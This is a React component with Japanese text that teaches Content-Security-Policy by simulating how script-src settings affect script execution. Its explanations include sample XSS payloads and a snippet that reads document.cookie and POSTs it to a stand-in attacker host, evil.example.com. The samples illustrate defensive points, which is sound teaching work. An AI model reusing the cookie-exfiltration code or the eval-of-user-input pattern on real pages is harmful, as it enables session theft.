import { useState, type ChangeEvent } from 'react'

type ExplanationMode = 'friendly' | 'strict'
type ScriptSrc = 'none' | 'self' | 'unsafe-inline' | 'unsafe-eval' | 'strict-dynamic'
type SimulationStatus = 'success' | 'warning' | 'error'

type Explanation = {
  message: string
  details: string
}

type SimulationResult = {
  status: SimulationStatus
  friendly: Explanation
  strict: Explanation
}

export function CspSimulator() {
  const [scriptSrc, setScriptSrc] = useState<ScriptSrc>('none')
  const [explanationMode, setExplanationMode] = useState<ExplanationMode>('friendly')

  const handleScriptSrcChange = (event: ChangeEvent<HTMLSelectElement>) => {
    const { value } = event.target
    if (value === 'none' || value === 'self' || value === 'unsafe-inline' || value === 'unsafe-eval' || value === 'strict-dynamic') {
      setScriptSrc(value)
    }
  }

  const simulate = (): SimulationResult => {
    if (scriptSrc === 'none') {
      return {
        status: 'warning',
        friendly: {
          message: '警告: CSP未設定 (すべてのスクリプトが実行されます)',
          details:
            `Content-Security-Policy ヘッダーがないと、ブラウザは「制限なし」と判断します。つまり、インラインスクリプト、外部CDN、eval() すべてが許可され、XSS に対して無防備です。

典型的な被害例:
1. 攻撃者がコメント欄などから <script>alert('XSS')</script> を投稿。
2. サーバーがサニタイズし損ねると、そのままユーザーのブラウザで実行。
3. Cookie を盗んだり、フォーム送信先を書き換えたりできます。

擬似コード (CSPなしページ):
\`\`\`html
<!-- HTTPヘッダー: Content-Security-Policy が存在しない -->
<script>
  const token = document.cookie
  fetch('https://evil.example.com/log', {
    method: 'POST',
    body: token
  })
</script>
\`\`\`

防御策: Content-Security-Policy ヘッダーを追加し、少なくとも script-src を設定しましょう。Helm や nginx で簡単に追加できます。

参考リンク:
・MDN: https://developer.mozilla.org/ja/docs/Web/HTTP/CSP
・OWASP Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
・YouTube: Troy Hunt「Practical Content Security Policy」https://www.youtube.com/watch?v=kw1-dS1fLwM`
        },
        strict: {
          message: 'セキュリティリスク: CSP未設定',
          details:
            `仕様: CSP ヘッダーが存在しない場合、User Agent は default allow list を適用し、すべてのスクリプト/スタイル/画像を許可します。
https://www.w3.org/TR/CSP3/

ブラウザ内部:
• policy container に空の指示が登録され、script-src は "*" 相当になります。
• DevTools > Security では "Content Security Policy is not set" と警告が表示されます (Chrome)。
• レポート機能 (report-to/report-uri) も設定されないため、違反検知もできません。

結果: XSS、DOM Clobbering、データインジェクションのリスクが増大します。`
        }
      }
    }

    if (scriptSrc === 'self') {
      return {
        status: 'success',
        friendly: {
          message: '成功: 同一オリジンのスクリプトのみ許可',
          details:
            `script-src 'self' を設定すると、自分のオリジンから提供するスクリプトだけ実行できます。インラインスクリプトや外部 CDN は拒否されるため、XSS の攻撃面を大幅に削減できます。

挙動:
• /static/app.js のような同一オリジンのファイル → 実行許可
• <script>alert('XSS')</script> のようなインライン → ブロック (Console にエラー)
• https://cdn.example.com/react.js → ネットワークは成功しても実行は拒否

擬似コード (ヘッダー例):

\`\`\`http
Content-Security-Policy: script-src 'self'
\`\`\`

不足する機能 (インラインイベントなど) が必要な場合は、nonce や hash を使って最小限のみ許可するのが推奨です。

参考リンク:
・MDN: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/script-src
・web.dev: https://web.dev/strict-csp/
・YouTube: https://www.youtube.com/watch?v=sPO65C7jrXk`
        },
        strict: {
          message: 'CSP有効: 同一オリジンのみ許可',
          details:
            `仕様: script-src 'self' は、同一オリジンからのスクリプトのみを allow-list に残します。\nhttps://www.w3.org/TR/CSP3/#directive-script-src\n\nブラウザ内部:\n• policy container に self-origin を登録し、その他の origin は violation として破棄。\n• inline script, event handler, javascript: URL は hash/nonce が無い限り拒否されます。\n• eval()/new Function() は 'unsafe-eval' が無いため TypeError を投げます。\n\nDevTools:\n• Console に「Refused to load the script because it violates the following Content Security Policy directive: \"script-src 'self'\"」が記録。\n• Network パネルの Status 列に (blocked:csp) が表示。\n\n効果まとめ:\n• 同一オリジンの外部スクリプト: ✓\n• インラインスクリプト: ✗\n• eval()/new Function(): ✗\n• 外部CDN: ✗`
        }
      }
    }

    if (scriptSrc === 'unsafe-inline') {
      return {
        status: 'warning',
        friendly: {
          message: '警告: インラインスクリプトを許可（推奨されません）',
          details:
            `script-src 'unsafe-inline' を追加すると、すべてのインライン <script>、onclick ハンドラ、javascript: URL が復活します。開発中は便利でも、本番で有効にすると XSS がそのまま通ります。\n\n例:\n• <button onclick=\"submitForm()\"> がそのまま実行\n• <a href=\"javascript:steal()\"> も許可\n• CMS の WYSIWYG から混入した <script>alert('XSS')</script> も実行\n\n擬似コード:\n\`\`\`http\nContent-Security-Policy: script-src 'self' 'unsafe-inline'\n\`\`\`\n\n安全にインラインスクリプトを使いたい場合は nonce か hash を利用する方法を検討してください。\n\n参考リンク:\n・MDN: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe-inline\n・Google Web Fundamentals: https://web.dev/strict-csp/#avoid-unsafe-inline\n・YouTube: LiveOverflow「Why unsafe-inline is dangerous」https://www.youtube.com/watch?v=wjQ7r17m3WM`
        },
        strict: {
          message: 'CSP弱体化: unsafe-inlineは非推奨',
          details:
            `仕様: 'unsafe-inline' は inline スクリプト、イベントハンドラ属性、javascript: URL を全許可します。\nhttps://www.w3.org/TR/CSP3/#unsafe-inline\n\nブラウザ内部:\n• parser inserted script は即座に評価され、CSP 違反として記録されません。\n• SecurityPolicyViolationEvent は発生せず、report-only ポリシーでも検知困難です。\n• Trusted Types を併用しない限り、DOM XSS を防ぐ術がなくなります。\n\n影響:\n• <script>alert('XSS')</script>: ✓ 実行\n• <button onclick="...">: ✓ 実行\n• javascript:alert(1): ✓ 実行\n• eval(): ✗ (unsafe-eval が別途必要)\n\n推奨: nonce や hash を使って必要最小限のインラインコードのみ許容してください。`
        }
      }
    }

    if (scriptSrc === 'unsafe-eval') {
      return {
        status: 'error',
        friendly: {
          message: '危険: eval()を許可（極めて危険）',
          details:
            `script-src 'unsafe-eval' を追加すると、eval()、new Function()、setTimeout('code', 0) など文字列からコードを生成する API が全て復活します。攻撃者が入力欄に仕込んだ文字列をそのまま実行してしまう危険が劇的に高まります。

ケーススタディ:
1. アプリが動的に式を計算するため eval(userInput) を呼び出す。
2. 攻撃者が userInput に "alert(document.cookie)" を入力。
3. CSP が unsafe-eval を許可していると、そのまま実行され Cookie が盗まれます。

擬似コード:
\`\`\`js
const userCode = location.hash.slice(1)
eval(userCode) // ❌ 攻撃者が #alert(document.cookie) を入れると実行
\`\`\`

alternative: WebAssembly や JSON.parse など安全な代替 API を利用し、unsafe-eval を外すのが推奨です。

参考リンク:
・MDN: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe-eval
・OWASP: https://owasp.org/www-community/attacks/eval_injection
・YouTube: LiveOverflow「Eval is dangerous」https://www.youtube.com/watch?v=0p5oK8G-gJg`
        },
        strict: {
          message: 'セキュリティリスク: unsafe-evalは危険',
          details:
            `仕様: 'unsafe-eval' は文字列を JavaScript に変換する API を全許可します。
https://www.w3.org/TR/CSP3/#unsafe-eval

ブラウザ内部:
• script evaluation policy の evalAllowed フラグが true になり、Function constructor / indirect eval が解禁されます。
• DevTools Console に "Refused to evaluate a string as JavaScript" の警告が出なくなります。
• Trusted Types を併用していても unsafe-eval があると防御が低下します。

攻撃例:
• eval(userInput) で Cookie 盗聴コードを実行
• new Function(attackerCode) で任意の関数を生成
• setTimeout('alert(1)', 0) で文字列コードを実行

推奨: WebAssembly.instantiate、JSON.parse、テンプレートエンジンなど安全な代替 API を使用し、unsafe-eval を削除してください。`
        }
      }
    }

    if (scriptSrc === 'strict-dynamic') {
      return {
        status: 'success',
        friendly: {
          message: '推奨: strict-dynamic で安全にスクリプトを動的読み込み',
          details:
            `script-src 'strict-dynamic' を nonce や hash と組み合わせると、信頼済みスクリプトが動的に追加した <script> も自動で許可されます。モダンな SPA では CDN のホワイトリストを維持する手間が省け、安全性と柔軟性を両立できます。

手順:
1. HTML の <script> タグに nonce="r4nd0m" を付与。
2. そのスクリプトが document.createElement('script') で別スクリプトを読み込む。
3. ブラウザは "strict-dynamic" により、その子スクリプトも自動的に許可します。

擬似コード:
\`\`\`http
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'self'
\`\`\`

参考リンク:
・MDN: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#strict-dynamic
・Google Chrome Developers: https://developer.chrome.com/blog/strict-csp/
・YouTube: Google Security Summit「Mastering CSP strict-dynamic」https://www.youtube.com/watch?v=OYkVVDAi0xA`
        },
        strict: {
          message: 'ベストプラクティス: strict-dynamicを使用',
          details:
            `仕様: 'strict-dynamic' は trustable inline script (nonce/hash 付き) が挿入した追加スクリプトを自動的に許可します。
https://www.w3.org/TR/CSP3/#strict-dynamic

ブラウザ内部:
• policy enforcement で strict-dynamic flag が立つと、URL allow-list の評価をスキップし、trusted script origin list に委譲します。
• nonce/hash のない inline script は依然として拒否されます。
• object-src, base-uri など他ディレクティブとの併用が推奨。

効果:
• nonce 付きエントリが document.createElement('script') で追加した外部スクリプト: ✓
• nonce/hash の無いインラインスクリプト: ✗
• 旧来のホワイトリスト (https://cdn.example.com) は無視されるため、メンテナンス負荷が減少。

DevTools の Security タブでは "strict-dynamic" が反映されているか確認できます。また、report-to を併用すると違反検知も可能です。`
        }
      }
    }

    return {
      status: 'error',
      friendly: {
        message: 'エラー',
        details: '想定外の設定です。'
      },
      strict: {
        message: 'エラー',
        details: '未対応のケースです。'
      }
    }
  }

  const result = simulate()
  const explanation = result[explanationMode]

  const cspHeader = (() => {
    if (scriptSrc === 'none') return '(CSP未設定)'
    if (scriptSrc === 'strict-dynamic') return "script-src 'nonce-r4nd0m' 'strict-dynamic'"
    return `script-src '${scriptSrc}'`
  })()

  const resultClass = `result ${result.status}`
  const resultIcon = result.status === 'success' ? '✓' : result.status === 'warning' ? '⚠' : '✗'

  return (
    <div className="simulator">
      <h2>Content-Security-Policy シミュレーター</h2>
      <p className="description">
        CSPヘッダーでXSS攻撃を防ぐ仕組みを学習する
      </p>

      <div className="controls">
        <div className="control-group">
          <label>
            <span>script-src ディレクティブ</span>
            <span className="hint">スクリプトの実行元を制限する</span>
            <select value={scriptSrc} onChange={handleScriptSrcChange}>
              <option value="none">なし (CSP未設定)</option>
              <option value="self">'self' (同一オリジンのみ)</option>
              <option value="unsafe-inline">'unsafe-inline' (インライン許可)</option>
              <option value="unsafe-eval">'unsafe-eval' (eval許可)</option>
              <option value="strict-dynamic">'strict-dynamic' (推奨)</option>
            </select>
          </label>
          <div className="option-description">
            {scriptSrc === 'none' && '⚠️ CSP未設定。XSS攻撃に対して無防備です。'}
            {scriptSrc === 'self' && '✓ 推奨設定。同一オリジンのスクリプトファイルのみ実行可能。インラインスクリプトとevalはブロック。'}
            {scriptSrc === 'unsafe-inline' && '⚠️ 非推奨。インラインスクリプトを許可するため、XSS攻撃のリスクが高まります。'}
            {scriptSrc === 'unsafe-eval' && '⚠️ 危険。eval()を許可するため、文字列をコードとして実行でき、XSSの温床になります。'}
            {scriptSrc === 'strict-dynamic' && '✓ 最も安全。nonce/hashで信頼されたスクリプトのみ実行し、そこから動的読み込みを許可。'}
          </div>
        </div>
      </div>

      <div className="visualization embedded">
        <div className="parent-container">
          <div className="parent-header">
            <div className="parent-info">
              <div className="site-name">myapp.com</div>
              <div className="site-label">あなたのWebサイト</div>
            </div>
            <div className="box-section">
              <div className="section-title">CSP設定</div>
              <code className="code-block">
                Content-Security-Policy:<br/>
                {cspHeader}
              </code>
            </div>
          </div>

          <div className="embedded-content">
            <div className="embedded-item">
              <div className="site-box target" style={{ margin: 0 }}>
                <div className="site-name">ブラウザの挙動</div>
                <div className="site-label">CSPによる制限</div>
                <div className="box-section">
                  <div className="section-title">スクリプト実行可否</div>
                  <code className="code-block" style={{ fontSize: '0.8rem' }}>
                    {scriptSrc === 'none' && (
                      <>
                        {'✓ すべて実行可能'}<br/>
                        {'• インラインスクリプト'}<br/>
                        {'• 外部スクリプト'}<br/>
                        {'• eval()'}<br/>
                      </>
                    )}
                    {scriptSrc === 'self' && (
                      <>
                        {'✓ 同一オリジンのスクリプトファイル'}<br/>
                        {'✗ インラインスクリプト'}<br/>
                        {'✗ 外部CDN'}<br/>
                        {'✗ eval()'}<br/>
                      </>
                    )}
                    {scriptSrc === 'unsafe-inline' && (
                      <>
                        {'✓ インラインスクリプト'}<br/>
                        {'✓ イベントハンドラ (onclick等)'}<br/>
                        {'✗ eval() (別途unsafe-eval必要)'}<br/>
                      </>
                    )}
                    {scriptSrc === 'unsafe-eval' && (
                      <>
                        {'✓ eval()'}<br/>
                        {'✓ new Function()'}<br/>
                        {'✓ setTimeout(string)'}<br/>
                        {'⚠️ XSSリスク大'}<br/>
                      </>
                    )}
                    {scriptSrc === 'strict-dynamic' && (
                      <>
                        {'✓ nonce付きスクリプト'}<br/>
                        {'✓ 信頼されたスクリプトからの動的読み込み'}<br/>
                        {'✗ 非nonce付きインライン'}<br/>
                        {'✗ eval()'}<br/>
                      </>
                    )}
                  </code>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="explanation-toggle" role="group" aria-label="説明モード切り替え">
        <button
          type="button"
          className={explanationMode === 'friendly' ? 'active' : ''}
          onClick={() => setExplanationMode('friendly')}
        >
          やさしい説明
        </button>
        <button
          type="button"
          className={explanationMode === 'strict' ? 'active' : ''}
          onClick={() => setExplanationMode('strict')}
        >
          厳密な説明
        </button>
      </div>

      <div className={resultClass}>
        <div className="result-icon">{resultIcon}</div>
        <div className="result-content">
          <div className="result-message">{explanation.message}</div>
          <div className="result-details">{explanation.details}</div>
        </div>
      </div>

      <div className="info-box">
        <strong>📚 仕様書リンク</strong>
        <p>
          <a href="https://www.w3.org/TR/CSP3/" target="_blank" rel="noopener noreferrer" style={{ color: '#667eea' }}>
            Content Security Policy Level 3 (W3C)
          </a>
        </p>
        <p>
          <a href="https://developer.mozilla.org/ja/docs/Web/HTTP/CSP" target="_blank" rel="noopener noreferrer" style={{ color: '#667eea' }}>
            MDN: コンテンツセキュリティポリシー概要
          </a>
        </p>
        <p>
          <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener noreferrer" style={{ color: '#667eea' }}>
            Google CSP Evaluator (診断ツール)
          </a>
        </p>
        <p>
          <a href="https://www.youtube.com/watch?v=sPO65C7jrXk" target="_blank" rel="noopener noreferrer" style={{ color: '#667eea' }}>
            YouTube: CSP Deep Dive (Google I/O)
          </a>
        </p>
      </div>

      <div className="info-box" style={{ marginTop: '1rem' }}>
        <strong>💡 主要なCSPディレクティブ</strong>
        <p style={{ whiteSpace: 'pre-line' }}>
          {`• default-src: すべてのリソースタイプのデフォルト
• script-src: JavaScriptの実行元
• style-src: CSSの読み込み元
• img-src: 画像の読み込み元
• connect-src: fetch, XHR, WebSocketの接続先
• font-src: フォントの読み込み元
• frame-src: iframeの埋め込み元

推奨設定例:
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'; base-uri 'self'`}
        </p>
      </div>

      <div className="faq-section">
        <h3>よくある質問 (FAQ)</h3>

        <div className="faq-item">
          <div className="faq-question">Q. CSPを設定したらインラインスクリプトが動かなくなりました</div>
          <div className="faq-answer">
            デフォルトではインラインスクリプトはブロックされます。<code>'unsafe-inline'</code>で許可できますが非推奨です。代わりにnonceやhashを使うか、外部ファイル化してください。例: <code>{'<script nonce="r4nd0m">'}</code>
          </div>
        </div>

        <div className="faq-item">
          <div className="faq-question">Q. nonceとhashの違いは？</div>
          <div className="faq-answer">
            <code>nonce</code>はページ読み込みごとにランダムな値を生成し、script/styleタグに付与します。<code>hash</code>はスクリプトの内容からSHA-256などでハッシュ値を生成します。動的にコンテンツが変わる場合はnonce、静的な場合はhashが適しています。
          </div>
        </div>

        <div className="faq-item">
          <div className="faq-question">Q. Google AnalyticsやGoogle Fontsを使うにはどうすればいいですか？</div>
          <div className="faq-answer">
            外部ドメインを明示的に許可します。例: <code>script-src 'self' https://www.googletagmanager.com; font-src https://fonts.googleapis.com</code>。ただし、strict-dynamicを使う場合は、nonceを付けたスクリプトから動的に読み込めば個別の許可は不要です。
          </div>
        </div>

        <div className="faq-item">
          <div className="faq-question">Q. CSP違反をレポートする方法は？</div>
          <div className="faq-answer">
            <code>report-uri</code>または<code>report-to</code>ディレクティブでレポート送信先を指定できます。また、<code>Content-Security-Policy-Report-Only</code>ヘッダーを使えば、ブロックせずにレポートだけ送信できるため、本番環境での影響確認に便利です。
          </div>
        </div>
      </div>
    </div>
  )
}
